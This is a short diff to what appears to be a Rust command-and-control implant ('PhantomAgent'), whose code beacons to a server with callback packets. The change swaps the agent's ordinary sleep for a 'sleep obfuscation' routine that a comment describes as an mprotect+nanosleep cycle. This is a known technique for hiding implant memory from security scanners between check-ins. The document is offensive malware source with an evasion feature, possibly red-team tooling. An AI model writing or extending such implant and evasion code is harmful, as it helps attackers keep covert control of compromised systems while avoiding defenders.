@@ -18,6 +18,7 @@ use crate::protocol::{
     AgentMetadata, build_callback_packet, build_init_packet, callback_ctr_blocks, parse_init_ack,
     parse_job_response,
 };
+use crate::sleep_obfuscate::blocking_sleep;
 use crate::transport::HttpTransport;
 
 /// Running Phantom session state.
@@ -208,7 +209,12 @@ impl PhantomAgent {
                 break;
             }
 
-            tokio::time::sleep(Duration::from_millis(self.compute_sleep_delay())).await;
+            let delay = Duration::from_millis(self.compute_sleep_delay());
+            let mode = self.config.sleep_mode;
+            // `spawn_blocking` offloads the mprotect+nanosleep cycle to a
+            // dedicated OS thread so the Tokio executor remains schedulable.
+            // It works on both multi-thread and current-thread runtimes.
+            let _ = tokio::task::spawn_blocking(move || blocking_sleep(delay, mode)).await;
             if self.checkin().await? {
                 break;
             }
